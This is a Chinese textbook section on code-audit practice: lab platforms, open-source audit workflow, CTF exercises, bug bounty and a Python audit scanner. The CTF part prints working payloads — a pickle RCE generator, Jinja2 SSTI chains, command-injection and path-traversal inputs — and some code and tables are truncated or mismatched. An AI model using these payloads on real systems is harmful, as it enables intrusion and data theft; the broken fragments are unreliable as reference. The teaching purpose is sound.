# 32.5 练习方法

代码审计是一项高度实践导向的技能——阅读十遍漏洞原理文档，不如亲手发现一个真实漏洞来得深刻。然而，"多练习"三个字过于笼统。本节系统梳理代码审计的练习方法论，从刻意练习的科学原理出发，覆盖在线靶场、开源项目审计、CTF竞赛、Bug Bounty、个人工具开发五大实践路径，并给出可落地的阶段性学习方案。

## 一、练习方法论基础

### 1.1 刻意练习原则

心理学家 K. Anders Ericsson 提出的"刻意练习"（Deliberate Practice）理论，是代码审计训练的科学基础。其核心要素包括：

| 要素 | 在代码审计中的体现 | 错误做法 |
|------|---------------------|----------|
| 明确目标 | 每次练习聚焦特定漏洞类型（如SQL注入） | 漫无目的地浏览代码 |
| 适度挑战 | 选择略高于当前能力的题目/项目 | 只做已经熟练的简单题 |
| 即时反馈 | 对照Writeup验证自己的发现 | 发现漏洞后不验证是否完整 |
| 重复强化 | 对同类型漏洞反复练习直到内化 | 每次都换新类型，浅尝辄止 |

**关键原则：深度优于广度。** 与其在10个平台上各做5道题，不如在1个平台上把某个漏洞类型从易到难全部吃透。具体做法：

1. **选择单一漏洞类型作为突破口**（建议从SQL注入或XSS开始，因为反馈最直观）
2. **在同一平台上从Low到High逐级递进**（如DVWA的4个安全等级）
3. **每做完一题，写一段解题笔记**：漏洞原理、触发条件、绕过技巧、防御方案
4. **间隔复习**：3天后重做同一题不看答案，验证是否真正掌握

### 1.2 练习记录与知识管理

没有记录的练习等于没有练习。建议建立个人知识库，使用 Markdown + Git 管理：

```text
my-security-knowledge/
├── vulns/
│   ├── sql-injection/
│   │   ├── 01-basic.md          # 基础注入
│   │   ├── 02-blind.md          # 盲注
│   │   ├── 03-union.md          # 联合查询注入
│   │   ├── 04-second-order.md   # 二次注入
│   │   └── 05-bypass.md         # WAF绕过
│   ├── xss/
│   ├── deserialization/
│   └── ...
├── tools/
│   ├── burpsuite.md
│   ├── semgrep.md
│   └── ...
├── projects/
│   ├── flask-security-audit/
│   └── ...
└── ctf/
    ├── buuctf-2024/
    └── ...
```

每个笔记文件的标准模板：

```markdown
# [漏洞类型] - [题目/项目名称]

## 题目描述
（简要记录题目背景）

## 解题过程
1. 信息收集：...
2. 漏洞发现：...
3. 漏洞利用：...
4. Flag/结果：...

## 漏洞原理
（用自己的话解释为什么存在这个漏洞）

## 关键代码片段
（标注有问题的代码行）

## 修复方案
（给出安全编码的写法）

## 关联知识
（链接到其他相关笔记）

## 复习记录
- 第1次：YYYY-MM-DD，用时XX分钟
- 第2次（复习）：YYYY-MM-DD，用时XX分钟
```

### 1.3 常见练习误区

| 误区 | 正确做法 |
|------|----------|
| 只看Writeup不动手 | 先独立尝试30分钟以上，实在卡住再看提示 |
| 追求做题数量 | 追求每道题的深度理解，能给别人讲清楚才算掌握 |
| 只关注"拿Flag" | 关注漏洞原理、利用链、修复方案的完整闭环 |
| 忽略失败的尝试 | 记录失败原因，分析为什么没想到某个攻击路径 |
| 跳过基础直接做高级题 | 基础不牢的高级练习只是在碰运气 |
| 用新工具替代思考 | 先手动理解漏洞，再学习工具自动化 |

## 二、在线练习平台

### 2.1 代码审计专项平台

#### （1）OWASP WebGoat

WebGoat 是 OWASP 官方维护的 Web 安全教学平台，提供交互式课程，每节课都包含理论讲解、漏洞演示和动手实验。

```bash
# Docker 方式部署（推荐）
docker run -p 8080:8080 -it webgoat/webgoat

# 访问 http://localhost:8080/WebGoat
# 默认无需登录，课程按模块组织
```

**核心课程模块与审计练习要点：**

| 模块 | 审计练习要点 | 推荐练习方式 |
|------|-------------|-------------|
| SQL注入（6个子模块） | 关注ORM层的参数拼接、动态SQL构建 | 从基础注入开始，逐步尝试盲注、联合查询 |
| XSS（反射/存储/DOM） | 审查前端渲染逻辑、CSP配置 | 对照源码理解为什么输入没有被转义 |
| 访问控制 | 检查权限校验逻辑的完整性 | 修改请求参数尝试越权访问 |
| SSRF | 追踪URL参数的服务器端处理流程 | 从内网地址探测到文件读取逐步深入 |
| XXE | 审查XML解析器的配置 | 尝试读取服务器文件、执行SSRF |
| 反序列化 | 分析Java反序列化入口点 | 构造POP链实现命令执行 |
| IDOR | 检查对象引用的权限校验 | 枚举ID发现未授权数据访问 |

**高效练习策略：**
1. 先不看源码尝试攻击，记录成功的攻击路径和失败的尝试
2. 切换到"查看源码"模式，找到漏洞的代码根因
3. 在 Impossible 级别中学习正确的防御写法
4. 用自己的审计脚本或 Semgrep 扫描 WebGoat 源码，验证能否自动发现这些漏洞

#### （2）OWASP Juice Shop

Juice Shop 是目前最现代的 Web 安全练习平台，包含 100+ 难度递增的安全挑战，模拟真实电商场景。

```bash
# Docker 部署
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop

# 访问 http://localhost:3000
# 挑战提示：点击页面右上角"Score Board"查看所有挑战
```

**挑战类别与代码审计关联：**

- **注入攻击**：SQL注入、NoSQL注入、ORM注入——审计数据库查询构建逻辑
- **认证缺陷**：弱密码、JWT攻击、OAuth漏洞——审计认证流程和令牌验证
- **XSS和CSS注入**：DOM XSS、HTTP头注入——审计前端渲染和响应头处理
- **访问控制**：IDOR、权限提升、数据泄露——审计API端点的权限校验
- **安全配置错误**：敏感信息泄露、不当错误处理——审计配置文件和异常处理
- **供应链攻击**：恶意npm包、依赖投毒——审计 package.json 和构建流程
- **反序列化**：Node.js反序列化——审计用户数据的解析逻辑

**阶段性学习路径：**

```text
入门阶段（1-2周）
├── 完成所有1星难度挑战（约15题）
├── 学习使用浏览器开发者工具（Network/Console/Sources）
├── 学习使用 Burp Suite Community Edition 抓包
└── 理解 HTTP 请求/响应的基本结构

进阶阶段（2-4周）
├── 完成所有2-3星难度挑战（约40题）
├── 学习 Burp Suite 高级功能（Repeater/Intruder/Decoder）
├── 理解 OWASP Top 10 每种漏洞的原理
└── 开始阅读 Juice Shop 的 Node.js 源码

高级阶段（4-8周）
├── 完成所有4-5星难度挑战（约40题）
├── 尝试编写自动化脚本批量完成挑战
├── 研究源码中的每个漏洞根因
└── 为发现的漏洞编写 Semgrep 规则
```

#### （3）Damn Vulnerable Web Application (DVWA)

DVWA 是最经典的安全练习平台，核心特色是同一漏洞的4个安全等级，让练习者直观对比"有防护 vs 无防护"的代码差异。

```bash
# Docker 部署
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# 默认账号：admin / password
# 登录后先点击 DVWA Security 切换安全等级
```

**安全等级与审计深度对照：**

| 等级 | 防护手段 | 审计要点 | 练习目标 |
|------|---------|---------|---------|
| Low | 无任何过滤 | 直接观察漏洞模式 | 理解漏洞原理 |
| Medium | 基础过滤（如关键词替换、简单正则） | 分析过滤逻辑的不完整性 | 学习绕过技巧 |
| High | 高级防护（如预编译、严格验证） | 理解防护的实现方式 | 学习复杂绕过 |
| Impossible | 安全实现（参数化查询、严格输入验证） | 学习正确的安全编码范式 | 掌握防御方案 |

**DVWA 审计练习建议：** 对每个漏洞模块，依次完成 Low → Medium → High → Impossible 四个等级。在每个等级中，先攻击成功，然后阅读 PHP 源码理解为什么这个等级存在/不存在漏洞。Impossible 级别的代码就是最佳实践参考。

#### （4）PortSwigger Web Security Academy

PortSwigger（Burp Suite 开发商）提供的免费在线学习平台，是目前 Web 安全领域最系统、最权威的学习资源之一。

**访问**：https://portswigger.net/web-security

**核心模块与实验室数量：**

| 模块 | 实验室数量 | 难度范围 | 代码审计关联度 |
|------|-----------|---------|--------------|
| SQL注入 | 18个 | 入门-高级 | 高：理解查询构建 |
| XSS | 30+个 | 入门-高级 | 高：理解输出编码 |
| CSRF | 12个 | 入门-进阶 | 中：理解令牌验证 |
| SSRF | 8个 | 进阶-高级 | 高：理解URL处理 |
| 访问控制 | 12个 | 入门-高级 | 高：理解权限模型 |
| 认证漏洞 | 14个 | 入门-高级 | 高：理解会话管理 |
| 服务端模板注入 | 8个 | 进阶-高级 | 高：理解模板引擎 |
| XXE注入 | 8个 | 入门-进阶 | 高：理解XML解析 |

**学习方法：**
1. 每个实验室先阅读左侧的理论文档，理解漏洞原理
2. 独立尝试完成实验，记录每一步操作
3. 卡住15分钟后查看官方提示（不直接看完整解答）
4. 完成后阅读官方详细解答，对比自己的思路
5. 将学到的攻击模式转化为代码审计检查项

#### （5）Hack The Box

综合性网络安全平台，包含从Web挑战到完整机器渗透的全方位练习。

**访问**：https://www.hackthebox.com

**代码审计相关练习类型：**

- **Web Challenges**：源码审计类题目，需要从给定源码中发现漏洞
- **Crypto Challenges**：密码学实现审计，发现算法实现中的弱点
- **Pwn Challenges**：二进制审计，分析C/C++程序中的内存安全问题
- **Machines（Easy/Medium）**：完整渗透测试，其中通常包含代码审计环节

### 2.2 代码审计专项练习

专注于密钥管理和安全配置的专项练习平台，帮助练习者识别代码和配置中的敏感信息泄露。

#### （2）OWASP WrongSecrets 的独特价值

WrongSecrets 与上述平台的不同之处在于：它模拟的是**真实世界中开发者常犯的配置错误**，而非经典的Web漏洞。这对于代码审计人员尤为重要，因为实际审计中，配置问题（如密钥硬编码、调试模式未关闭、日志级别不当）的出现频率远高于SQL注入等经典漏洞。

## 三、开源项目审计练习

### 3.1 适合审计练习的开源项目

选择审计练习项目时，应考虑三个因素：**代码规模适中**（便于完整审计）、**活跃度高**（有历史CVE可供验证）、**语言匹配**（与你的技术栈一致）。

#### 入门级项目（Python）

```bash
# 1. Flask-Security（Web安全库）
git clone https://github.com/pallets-eco/flask-security
cd flask-security
# 审计重点：认证流程、授权检查、CSRF防护、密码哈希实现
# 代码量：~10K行，适合1-2天完整审计

# 2. Django REST Framework（API框架）
git clone https://github.com/encode/django-rest-framework
cd django-rest-framework
# 审计重点：序列化验证、认证机制、权限控制、输入过滤
# 代码量：~50K行，建议聚焦认证和权限模块

# 3. Requests（HTTP库）
git clone https://github.com/psf/requests
cd requests
# 审计重点：证书验证逻辑、重定向处理、代理认证、连接池安全
# 代码量：~30K行，代码质量高，适合学习安全编码范式
```

#### 进阶级项目（JavaScript/Node.js）

```bash
# 1. Express.js（Web框架）
git clone https://github.com/expressjs/express
cd express
# 审计重点：路由匹配逻辑、中间件执行链、错误处理安全性
# 注意：关注 path-to-regexp 库的正则安全

# 2. Mongoose（MongoDB ODM）
git clone https://github.com/Automattic/mongoose
cd mongoose
# 审计重点：查询构建器的注入防护、Schema验证完整性、插件沙箱
# 关注：$where、$regex、$gt等操作符的过滤

# 3. jsonwebtoken（JWT库）
git clone https://github.com/auth0/node-jsonwebtoken
cd jsonwebtoken
# 审计重点：算法混淆攻击(alg:none)、密钥管理、令牌验证逻辑
# 历史CVE：CVE-2022-23529（密钥注入）
```

#### 高级项目（C/C++）

```bash
# 1. OpenSSL（加密库）
git clone https://github.com/openssl/openssl
cd openssl
# 审计重点：内存管理（malloc/free配对）、协议状态机、密码学实现正确性
# 经典案例：Heartbleed（CVE-2014-0160）就是内存读越界

# 2. Nginx（Web服务器）
git clone https://github.com/nginx/nginx
cd nginx
# 审计重点：HTTP解析器、缓冲区管理、模块间交互安全
# 关注：请求走私（request smuggling）相关逻辑

# 3. Redis（内存数据库）
git clone https://github.com/redis/redis
cd redis
# 审计重点：命令注入（EVAL Lua脚本）、未授权访问、主从复制安全
# 经典攻击：通过主从复制写入crontab获取RCE
```

#### 针对性练习项目推荐

| 你想练习的技能 | 推荐项目 | 审计聚焦点 |
|--------------|---------|-----------|
| 认证/授权漏洞 | Flask-Security | 登录逻辑、Session管理、权限检查 |
| 序列化漏洞 | PyYAML, pickle | 反序列化入口点、类型混淆 |
| 注入漏洞 | SQLAlchemy, Sequelize | 查询构建、参数绑定、ORM绕过 |
| 加密实现 | bcrypt, argon2-cffi | 密码哈希实现、盐值生成、时序攻击防护 |
| 文件处理 | Pillow, Sharp | 路径穿越、文件类型验证、内存安全 |
| 网络协议 | httpx, aiohttp | TLS验证、重定向处理、代理安全 |

### 3.2 开源项目审计流程

#### 步骤一：项目调研（1-2天）

审计一个开源项目之前，必须先建立对项目的全面认知。盲目开始逐行阅读代码是最低效的审计方式。

```bash
# 1. 了解项目基本信息
cat README.md                    # 项目定位和功能
cat CONTRIBUTING.md              # 贡献规范（了解代码组织方式）
cat SECURITY.md                  # 安全策略（了解漏洞报告流程）
cat CHANGELOG.md                 # 版本历史（关注安全修复记录）

# 2. 分析代码结构和规模
# Python 项目
find . -name "*.py" | head -50
wc -l $(find . -name "*.py" -not -path "./test*") | tail -1

# JavaScript 项目
find . -name "*.js" -not -path "./node_modules/*" | head -50
wc -l $(find . -name "*.js" -not -path "./node_modules/*") | tail -1

# 3. 查看已知安全问题
# GitHub Issues 中搜索 security 标签
# 在 CVE 数据库中搜索：https://cve.mitre.org/
# 查看依赖的已知漏洞：npm audit / pip-audit

# 4. 分析依赖关系
cat requirements.txt             # Python 依赖
cat package.json                 # Node.js 依赖
cat pom.xml                      # Java Maven 依赖
# 关注：是否有已知漏洞的依赖版本
```

**调研阶段的输出物：**
- 项目架构图（用 Mermaid 或手绘）
- 关键入口点清单（API端点、命令行参数、配置文件）
- 依赖树及其版本号
- 历史安全问题列表

#### 步骤二：自动化扫描（1天）

自动化扫描的目的是快速定位高风险区域，为人工审计提供优先级指引。自动化工具无法发现逻辑漏洞，但能高效发现模式化问题。

- LOW/INFO 级别问题：批量记录，后续统一处理

- 扫描工具未覆盖的区域：标记为需要人工重点关注

#### 步骤三：人工审计（3-5天）

人工审计是代码审计的核心环节，需要审计人员具备安全思维和代码阅读能力。

**审计入口点识别：**

```bash
# Python Web 应用入口点
grep -rn "@app\.route\|@blueprint\.route" --include="*.py" | head -20
grep -rn "request\." --include="*.py" | grep -v "test_" | head -30

# Node.js Web 应用入口点
grep -rn "app\.\(get\|post\|put\|delete\|patch\)" --include="*.js" | head -20
grep -rn "req\.body\|req\.params\|req\.query" --include="*.js" | head -30

# Java Web 应用入口点
grep -rn "@RequestMapping\|@GetMapping\|@PostMapping" --include="*.java" | head -20
```

**危险函数与模式追踪：**

```bash
# 命令注入相关
grep -rn "os\.system\|os\.popen\|subprocess.*shell=True\|exec(" --include="*.py"
grep -rn "child_process\|exec\(\|execSync" --include="*.js"

# SQL注入相关
grep -rn 'f".*SELECT\|f".*INSERT\|f".*UPDATE\|f".*DELETE' --include="*.py"
grep -rn '\.query(.*+\|\.raw(' --include="*.py"

# 反序列化相关
grep -rn "pickle\.loads\|yaml\.load\|marshal\.loads" --include="*.py"
grep -rn "unserialize\|JSON\.parse" --include="*.php"

# 文件操作相关
grep -rn "open(\|os\.path\.join\|shutil\." --include="*.py" | grep -v test
```

**数据流追踪方法：** 对于自动化工具标记的可疑代码，手动追踪数据流：

1. **找到数据源（Source）**：用户输入、文件读取、网络请求、环境变量
2. **追踪数据流（Propagation）**：数据经过了哪些函数和数据结构的变换
3. **找到汇聚点（Sink）**：危险函数调用（exec、SQL查询、文件写入）
4. **检查净化措施（Sanitization）**：中间是否有输入验证、编码、过滤

### 3.3 审计思维训练

代码审计不仅是技术活，更是思维方式的训练。以下是几种核心审计思维：

**威胁建模思维（Threat Modeling）：** 在阅读代码之前，先思考：
- 这个系统处理哪些类型的用户数据？
- 数据从哪里来，到哪里去？
- 哪些操作需要认证？哪些需要授权？
- 如果我是攻击者，最想利用哪个功能？

**攻击面枚举思维（Attack Surface Enumeration）：** 逐步列出所有用户可控的输入点：
- HTTP请求参数（GET/POST/Cookie/Header）
- 文件上传和下载
- 第三方API调用
- Webhook和回调接口
- 配置文件和环境变量
- 命令行参数

**最小权限思维（Least Privilege）：** 检查每个组件是否遵循最小权限原则：
- 数据库连接是否使用了不必要的高权限账号？
- 文件操作是否有适当的权限检查？
- 网络访问是否限制了必要的端口和地址？
- 进程间通信是否有身份验证？

### 4.1 代码审计相关CTF类型

CTF（Capture The Flag）竞赛是锻炼快速漏洞发现能力的最佳方式。在限时高压环境下，审计人员需要快速定位关键代码、识别漏洞模式、构造利用方案。

**代码审计相关题目类型：**

| 题目类型 | 描述 | 关键技能 | 典型考点 |
|----------|------|----------|---------|
| Web | Web应用安全 | 漏洞识别与利用 | SQL注入、XSS、反序列化、SSRF |
| Source | 源码审计 | 代码阅读与分析 | 逻辑漏洞、认证绕过、权限提升 |
| Crypto | 密码学 | 算法实现审计 | 弱加密、密钥泄露、实现缺陷 |

### 4.2 经典CTF考点深度分析

#### PHP代码审计常见考点

```text
PHP代码审计高频考点
├── 弱类型比较（== vs ===）
│   ├── "0e123" == "0e456" → true（科学计数法都等于0）
│   ├── "1abc" == 1 → true（字符串转数字比较）
│   └── 绕过：利用类型混淆绕过身份验证或哈希比较
│
├── 伪随机数
│   ├── mt_rand() 种子可预测（通过输出反推种子）
│   ├── rand() 在某些实现中可预测
│   └── 绕过：使用 randcrack 或数学分析预测下一个随机数
│
├── 反序列化漏洞
│   ├── __wakeup() 绕过（CVE-2016-7124，属性数大于实际数可绕过）
│   ├── __destruct() 利用（对象销毁时自动执行）
│   ├── POP链构造（利用已有类的魔术方法链式调用）
│   └── 绕过：构造合适的POP链实现文件读写或命令执行
│
├── 文件包含
│   ├── php://filter 读取源码（base64编码绕过）
│   ├── data:// 协议执行代码
│   ├── 日志注入（User-Agent写入日志后包含日志文件）
│   └── 绕过：空字节截断（PHP<5.3.4）、短标签
│
├── preg_replace /e 修饰符
│   ├── /e 修饰符会执行替换后的字符串作为PHP代码
│   └── PHP 7.0+ 已移除，但老版本仍广泛存在
│
├── extract() 变量覆盖
│   ├── extract($_GET) 将GET参数直接注册为变量
│   └── 绕过：覆盖关键变量（如 $auth、$is_admin）绕过检查
│
├── parse_str() 变量覆盖
│   └── 无第二个参数时直接覆盖当前作用域变量
│
└── register_globals（PHP < 4.2.0）
    └── 自动将URL参数注册为全局变量
```

#### Python代码审计常见考点

```python
# 1. PyYAML 反序列化（CVE-2017-8927）
import yaml
# 危险写法
yaml.load(user_input)  # 可执行任意Python代码
# 安全写法
yaml.safe_load(user_input)

# 2. Jinja2 模板注入（SSTI）
from jinja2 import Template
# 危险写法
template = Template(user_input)  # 用户可执行任意表达式
# 攻击示例：{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# 3. pickle 反序列化

# 危险：pickle.loads() 可执行任意代码
# __reduce__ 方法在反序列化时被调用，可返回一个可调用对象

# 4. eval/exec 代码注入
eval(user_input)  # 直接执行用户输入的Python代码

# 5. 命令注入
os.system(f"ping {user_input}")
# 攻击：user_input = "127.0.0.1; cat /etc/passwd"

# 6. 路径穿越

# 攻击：user_input = "../../etc/passwd"
```

### 4.3 CTF练习题实战

#### 题目1：PHP弱类型审计

```php
<?php
$flag = "flag{xxxx}";

if (isset($_GET['password'])) {
    // strcmp() 在比较数组和字符串时会报错并返回 NULL
    // NULL == 0 在PHP中为 true
    if (strcmp($_GET['password'], $flag) == 0) {
        echo $flag;
    } else {
        echo "Wrong!";
    }
}
?>
```

**攻击思路分析：**
- strcmp() 期望两个字符串参数，传入数组会触发类型错误
- PHP 7.x 中 strcmp() 失败返回 NULL（PHP 5.x 返回 -1）
- NULL == 0 为 true（松散比较），因此可以绕过

**利用方式：**
```bash
# 传入数组参数使 strcmp 返回 NULL
curl "http://target/?password[]=anything"

# 另一种思路：利用PHP的类型转换
# 以0e开头的字符串会被当作科学计数法，值为0
# 如果 flag 也是 0e 开头的 md5 值，则可以绕过
curl "http://target/?password=0e99999"
```

#### 题目2：Python反序列化审计

```python
import pickle
import base64

class User:
    def __init__(self, name, role):
        self.name = name
        self.role = role

def login(session_data):
    try:
        data = base64.b64decode(session_data)
        user = pickle.loads(data)  # 危险：反序列化用户可控数据
        if user.role == 'admin':
            return "Welcome admin!"
        else:
            return f"Welcome {user.name}"
    except:
        return "Invalid session"

# 挑战：获取 admin 权限或执行任意命令
```

**利用代码：**
```python
import pickle
import base64
import os
import requests

# 方法1：修改 role 属性（仅获取admin权限）
class AdminUser:
    def __reduce__(self):
        # 修改属性使 role='admin'
        return (User, ('hacker', 'admin'))

# 方法2：命令执行（RCE）
class RCE:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

# 生成 payload
payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(f"Payload: {payload}")

# 发送请求
resp = requests.get(f"http://target/login?session={payload}")
print(resp.text)
```

#### 题目3：SSTI模板注入

```python
# Flask + Jinja2 SSTI 题目
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    # 危险：直接将用户输入作为模板字符串

# 挑战：读取 /flag.txt 文件内容
```

**攻击 Payload 递进：**
```text
# 阶段1：测试是否存在SSTI
{{7*7}}  → 返回 Hello 49!（确认存在模板注入）

# 阶段2：确认模板引擎
{{config}}  → 返回Flask配置信息

# 阶段3：获取对象链
{{''.__class__.__mro__[2].__subclasses__()}}  → 列出所有可用类

# 阶段4：执行命令
{{''.__class__.__mro__[2].__subclasses__()[XXX]('cat /flag.txt',shell=True,stdout=-1).communicate()}}
# 或使用 os 模块
{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}
```

### 5.1 Bug Bounty作为练习方式

Bug Bounty（漏洞赏金计划）是将代码审计能力变现的最佳途径，同时也是一个极好的练习平台——你审计的是真实世界的系统，发现的漏洞有真实的影响力和经济回报。

|------|------|------|---------|

| Bugcrowd | bugcrowd.com | 项目多样，有公开和私有计划 | 中 |
| Intigriti | intigriti.com | 欧洲平台，创新挑战多 | 中 |
| 漏洞盒子 | vulbox.com | 国内平台，中文界面 | 低 |
| 补天 | butian.net | 奇安信旗下，国内项目为主 | 低 |

### 5.2 Bug Bounty练习策略

**入门阶段（1-3个月）：**
- 选择范围较小、规则清晰的公开计划（如小型SaaS公司）
- 专注1-2种漏洞类型（建议XSS或IDOR，发现率高）
- 阅读该平台上的历史报告，学习什么样的报告容易被接受

**进阶阶段（3-6个月）：**
- 扩展漏洞类型覆盖（SSRF、SQL注入、认证绕过）
- 尝试私有计划（需要申请加入，项目质量更高）
- 学习自动化发现（批量扫描子域名、端口、API端点）

**报告质量标准：**
- 清晰的漏洞描述（一句话概括影响）
- 完整的复现步骤（任何人按步骤都能重现）
- 影响评估（能造成什么损害，影响范围多大）
- 修复建议（给出具体的代码级修复方案）

### 6.2 构建审计工具

#### 项目1：自定义Semgrep规则库

```yaml
# my-semgrep-rules/python/security.yaml
rules:
  - id: python-command-injection-os-system
    pattern: os.system(...)
    message: 使用os.system执行命令存在注入风险，应使用subprocess.run(..., shell=False)

  - id: python-command-injection-shell-true
    pattern: subprocess.call(..., shell=True)
    message: subprocess使用shell=True存在命令注入风险

      subprocess.run([...], shell=False)

  - id: python-yaml-unsafe-load
    pattern: yaml.load(...)
```

#### 项目2：Python代码安全审计脚本

```python
#!/usr/bin/env python3
"""
Python 代码安全审计脚本
功能：扫描Python项目中的常见安全问题，生成审计报告
"""

import os
import re
import json
import sys
from dataclasses import dataclass, asdict
from typing import List, Dict
from pathlib import Path
from collections import defaultdict
from datetime import datetime


@dataclass
class Finding:
    severity: str        # HIGH, MEDIUM, LOW, INFO
    rule_id: str
    message: str
    cwe: str             # CWE编号
    file_path: str
    line_number: int
    code_snippet: str
    fix_suggestion: str


class PythonSecurityAuditor:
    """Python项目安全审计器"""

    def __init__(self, project_path: str):
        self.project_path = Path(project_path)
        self.findings: List[Finding] = []
        self.scanned_files = 0
        self.rules = self._load_rules()

    def _load_rules(self) -> Dict:
        """加载审计规则"""
        return {
            'dangerous_eval': {
                'pattern': r'\b(eval|exec)\s*\(',
                'severity': 'HIGH',
                'message': '使用eval/exec执行动态代码，可能导致任意代码执行',
                'cwe': 'CWE-95',
                'fix': '避免使用eval/exec，如需动态执行考虑ast.literal_eval或沙箱环境'
            },
            'os_system': {
                'pattern': r'\bos\.(system|popen)\s*\(',
                'severity': 'HIGH',
                'message': '使用os.system/os.popen执行系统命令，存在命令注入风险',
                'cwe': 'CWE-78',
                'fix': '使用subprocess.run(..., shell=False)并传入列表参数'
            },
            'shell_true': {
                'pattern': r'subprocess\.\w+\(.*shell\s*=\s*True',
                'severity': 'HIGH',
                'message': 'subprocess使用shell=True，存在命令注入风险',
                'cwe': 'CWE-78',
                'fix': '设置shell=False，使用列表传递命令参数'
            },
            'sql_injection_fstring': {
                'pattern': r'f["\'].*(?:SELECT|INSERT|UPDATE|DELETE|FROM|WHERE).*{',
                'severity': 'HIGH',
                'message': '使用f-string构建SQL查询，可能存在SQL注入',
                'cwe': 'CWE-89',
                'fix': '使用参数化查询: cursor.execute("SELECT ... WHERE id=%s", (id,))'
            },
            'sql_injection_format': {
                'pattern': r'\.format\(.*\).*(?:SELECT|INSERT|UPDATE|DELETE)',
                'severity': 'HIGH',
                'message': '使用str.format()构建SQL查询，可能存在SQL注入',
                'cwe': 'CWE-89',
                'fix': '使用参数化查询替代字符串格式化'
            },
            'pickle_loads': {
                'pattern': r'\bpickle\.loads?\b',
                'severity': 'HIGH',
                'message': '使用pickle反序列化不可信数据，可能导致RCE',
                'cwe': 'CWE-502',
                'fix': '使用json等安全格式替代pickle，或使用RestrictedUnpickler'
            },
            'yaml_load': {
                'pattern': r'\byaml\.load\b(?!.*Loader\s*=\s*yaml\.SafeLoader)',
                'severity': 'HIGH',
                'message': '使用yaml.load而非yaml.safe_load，存在反序列化风险',
                'cwe': 'CWE-502',
                'fix': '使用yaml.safe_load()替代yaml.load()'
            },
            'hardcoded_password': {
                'pattern': r'(?:password|passwd|secret|api_key|token|apikey)\s*=\s*["\'][^"\']{8,}["\']',
                'severity': 'MEDIUM',
                'message': '检测到可能的硬编码凭据',
                'cwe': 'CWE-798',
                'fix': '使用环境变量或密钥管理服务存储敏感信息'
            },
            'insecure_random': {
                'pattern': r'\b(?:random\.randint|random\.random|random\.choice|random\.randrange)\b',
                'severity': 'MEDIUM',
                'message': '使用了不安全的随机数生成器，不应用于安全敏感场景',
                'cwe': 'CWE-330',
                'fix': '安全场景使用secrets模块或os.urandom()'
            },
            'debug_enabled': {
                'pattern': r'DEBUG\s*=\s*True',
                'severity': 'MEDIUM',
                'message': '调试模式开启，可能泄露敏感信息',
                'cwe': 'CWE-489',
                'fix': '生产环境确保DEBUG=False，使用环境变量控制'
            },
            'cors_wildcard': {
                'pattern': r'(?:Access-Control-Allow-Origin|CORS_ORIGIN_ALLOW_ALL).*[\*True]',
                'severity': 'MEDIUM',
                'message': 'CORS配置为允许所有来源，可能存在跨域数据泄露',
                'cwe': 'CWE-942',
                'fix': '限制允许的来源域名列表'
            },
            'path_traversal': {
                'pattern': r'open\(.*(?:request|input|argv|param)',
                'severity': 'MEDIUM',
                'message': '文件操作使用了用户可控的路径，可能存在路径穿越',
                'cwe': 'CWE-22',
                'fix': '使用os.path.abspath + os.path.realpath验证路径，拒绝..等穿越字符'
            },
            'weak_md5': {
                'pattern': r'\bhashlib\.md5\b',
                'severity': 'LOW',
                'message': '使用MD5哈希算法，已被证明不安全',
                'cwe': 'CWE-328',
                'fix': '密码哈希使用bcrypt/argon2，完整性校验使用SHA-256+'
            },
            'assert_in_production': {
                'pattern': r'\bassert\b',
                'severity': 'INFO',
                'message': 'assert语句在优化模式(-O)下会被移除，不应作为安全检查',
                'cwe': 'CWE-617',
                'fix': '使用if语句+raise替代assert进行安全检查'
            }
        }

    def _scan_file(self, file_path: Path):
        """扫描单个文件"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
        except Exception:
            return

        self.scanned_files += 1
        for line_num, line in enumerate(lines, 1):
            # 跳过注释行
            stripped = line.strip()
            if stripped.startswith('#') or stripped.startswith('//'):
                continue

            for rule_id, rule in self.rules.items():
                if re.search(rule['pattern'], line, re.IGNORECASE):
                    self.findings.append(Finding(
                        severity=rule['severity'],
                        rule_id=rule_id,
                        message=rule['message'],
                        cwe=rule['cwe'],
                        file_path=str(file_path),
                        line_number=line_num,
                        code_snippet=stripped[:120],
                        fix_suggestion=rule['fix']
                    ))

    def audit(self):
        """执行审计"""
        skip_dirs = {'__pycache__', '.venv', 'venv', 'env', '.git',
                     'node_modules', '.tox', '.mypy_cache'}

        for py_file in self.project_path.rglob('*.py'):
            # 跳过特定目录和文件
            parts = py_file.parts
            if any(d in skip_dirs for d in parts):
                continue
            if any(skip in py_file.name for skip in ['test_', '_test.py', 'conftest.py']):
                continue
            self._scan_file(py_file)

    def generate_report(self) -> str:
        """生成文本格式审计报告"""
        report = []
        report.append("=" * 60)
        report.append("Python 代码安全审计报告")
        report.append("=" * 60)
        report.append(f"项目路径: {self.project_path}")
        report.append(f"扫描文件: {self.scanned_files}")
        report.append(f"发现问题: {len(self.findings)}")
        report.append(f"报告时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append("")

        # 按严重性分组统计
        by_severity = defaultdict(list)
        for finding in self.findings:
            by_severity[finding.severity].append(finding)

        report.append("## 问题统计")
        for severity in ['HIGH', 'MEDIUM', 'LOW', 'INFO']:
            count = len(by_severity.get(severity, []))
            if count > 0:
                report.append(f"  [{severity}] {count}个")
        report.append("")

        # 详细问题列表
        for severity in ['HIGH', 'MEDIUM', 'LOW', 'INFO']:
            findings = by_severity.get(severity, [])
            if not findings:
                continue
            report.append(f"\n{'='*40}")
            report.append(f"[{severity}] ({len(findings)}个问题)")
            report.append(f"{'='*40}")
            for i, f in enumerate(findings, 1):
                report.append(f"\n  {i}. {f.message}")
                report.append(f"     规则: {f.rule_id} ({f.cwe})")
                report.append(f"     位置: {f.file_path}:{f.line_number}")
                report.append(f"     代码: {f.code_snippet}")
                report.append(f"     修复: {f.fix_suggestion}")

        return "\n".join(report)

    def generate_json_report(self) -> str:
        """生成JSON格式审计报告"""
        report = {
            "project": str(self.project_path),
            "scan_time": datetime.now().isoformat(),
            "scanned_files": self.scanned_files,
            "total_findings": len(self.findings),
            "summary": {},
            "findings": [asdict(f) for f in self.findings]
        }
        by_severity = defaultdict(int)
        for f in self.findings:
